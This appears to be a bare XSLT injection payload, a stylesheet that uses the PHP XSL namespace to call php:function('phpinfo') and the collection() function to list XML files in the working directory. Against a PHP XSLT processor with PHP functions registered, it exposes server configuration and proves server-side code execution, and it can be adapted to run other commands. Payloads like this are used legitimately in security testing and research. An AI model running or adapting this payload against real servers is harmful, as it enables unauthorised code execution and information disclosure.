<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
<xsl:template match="/" >
  <xsl:variable name="documents" select="collection('.?select=*.xml')"/>
                 <xsl:value-of  select="php:function('phpinfo')"/>


         </xsl:template>
  </xsl:stylesheet>
